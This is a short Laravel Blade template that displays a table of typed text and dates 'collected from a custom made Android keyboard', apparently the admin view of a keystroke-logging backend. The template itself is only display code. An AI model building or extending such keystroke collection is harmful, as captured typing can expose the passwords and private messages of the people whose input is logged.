@extends('data.datalayout')

@section('title')
Collected keyboard info
@endsection

@section('description')
Typing info collected from a custom made Android keyboard.
@endsection

@section('headers')
<th>#</th>
<th>Text</th>
<th>Date</th>
@endsection

@section('info') 
@foreach($data as $l)
<tr>
        <th>{{$l->id}} </th>
        <th>{{$l->text}} </th>
        <th>{{$l->date}} </th>
</tr> 
@endforeach
@endsection

@section('name')
KeyboardController
@endsection